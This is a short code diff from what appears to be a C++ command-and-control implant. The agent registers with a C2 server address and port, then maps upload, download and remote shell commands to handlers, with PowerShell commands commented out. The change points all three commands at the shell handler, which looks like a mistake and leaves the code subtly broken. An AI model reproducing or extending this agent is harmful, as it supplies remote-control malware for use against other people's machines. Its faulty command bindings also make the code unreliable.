@@ -25,9 +25,9 @@ int main()
 
 	agent.Register(C2_IP, C2_PORT);
 
-	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::upload, agent));
-	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::download, agent));
-	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, agent));
+	cmdHandler.RegisterCommand(UPLOAD_CMD, std::bind(&Agent::shell, std::placeholders::_1));
+	cmdHandler.RegisterCommand(DOWNLOAD_CMD, std::bind(&Agent::shell, std::placeholders::_1));
+	cmdHandler.RegisterCommand(SHELL_CMD, std::bind(&Agent::shell, std::placeholders::_1));
 	//cmdHandler.RegisterCommand(POWERSHELL_CMD, std::bind(&Agent::powershell, agent));
 	//cmdHandler.RegisterCommand(PSIMPORT_CMD, std::bind(&Agent::ps-import, agent));
 
